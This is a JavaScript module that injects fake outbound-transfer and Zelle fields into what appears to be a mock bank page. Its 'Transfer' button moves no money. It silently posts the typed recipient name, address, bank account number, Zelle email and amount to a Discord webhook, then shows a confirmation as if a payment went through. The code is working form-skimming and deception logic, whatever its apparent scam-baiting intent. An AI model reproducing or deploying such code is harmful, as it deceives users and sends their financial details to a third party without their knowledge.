const btnHtml = `<button id="foreignLocal" type="button">Send to an account that you don't own</button> <button id="zelle" type="button">Transfer to a Zelle™ Account</button>`
const infoHtml = `    <div id="outT">
Recepient's Name: <input id="rN"></input>
Recepient's Address: <input id="rA"></input>
Recepient's Bank Account Number: <input id="rBANK"></input>
Account Type: <select id="rAT"> <option value="Checking">Checking</option> <option value="Savings">Savings</option> </select>
</div>

<div id="zelleD">
Zelle™ Email: <input id="zelleE"></input>
</div>
`
const anotherBtnHtml = `<p id="transferO" class="btn btn-primary mt-4" style="cursor: pointer;">Transfer</p>`
console.log("Outbound Transfer Module Loaded - Made by Level")

window.addEventListener('DOMContentLoaded', (event) => {
document.querySelector("body > div.jumbotron > form > div:nth-child(8) > div").insertAdjacentHTML("afterbegin", anotherBtnHtml)
document.querySelector("body > div > form > div:nth-child(4) > label").insertAdjacentHTML("afterend", btnHtml)
document.querySelector("body > div > form > div:nth-child(8) > div > button").innerHTML = "Are you sure? Make sure this is an account that you trust."
document.querySelector("body > div > form > div:nth-child(8) > div > button").style.display = "none"

function id(element) {
    return document.getElementById(element)
}


document.querySelector("body > div.jumbotron > form > div:nth-child(4) > div").insertAdjacentHTML("afterbegin", infoHtml)
var fL = id('foreignLocal')
var outT = id('outT')
var zelleD = id('zelleD')
outT.style = "display: none; flex-direction: column";
zelleD.style = "display: none; flex-direction: column";

var zelle = id('zelle');

zelle.addEventListener('click', () => {
    zelleD.style.display = "flex";
    outT.style.display = "none";
    id('destinationAccount').style.display = "none";
    id("destinationAccount").innerHTML = `<option value="999999">Checking Account</option>`
})

fL.addEventListener('click', () => {
    if (fL.innerHTML == "Send to an account that you don't own") {
        fL.innerHTML = "Send to one of your account(s)"
        zelleD.style.display = "none"
        document.querySelector("#destinationAccount").style.display = "none";
        id("destinationAccount").innerHTML = `<option value="999999">Checking Account</option>`
        outT.style.display = "flex"
    }
    else if (fL.innerHTML == "Send to one of your account(s)") {
        fL.innerHTML = "Send to an account that you don't own";
        zelleD.style.display = "none"

        id("destinationAccount").innerHTML = `<option value="1">Checking Account</option> 
        <option value="2">Savings Account</option> 
        <option value="3">AMEX Platinum Credit Card</option>`

        document.querySelector("#destinationAccount").style.display = "initial"
        outT.style.display = "none"
    }
})

// Discord Webhook Sending
var rN = id('rN');
var rA = id('rA');
var rBANK = id('rBANK');
var rAT = id('rAT');
var Am = id('amount');
var zE = id('zelleE');

id('transferO').addEventListener('click', () => {
    var url = localStorage.getItem('DiscordWebhook');
    const msg = {
        "content": `Name: ${rN.value}, Address: ${rA.value}, Bank Account Number: ${rBANK.value}, Account Type: ${rAT.value}, Zelle Email: ${zelleE.value}, Amount "Transferred": ${Am.value}`
    }
    fetch(url, {"method":"POST", "headers": {"content-type": "application/json"}, "body": JSON.stringify(msg)})
    document.querySelector("body > div > form > div:nth-child(8) > div > button").style.display = "initial";
    id('transferO').style.display = "none"
})
})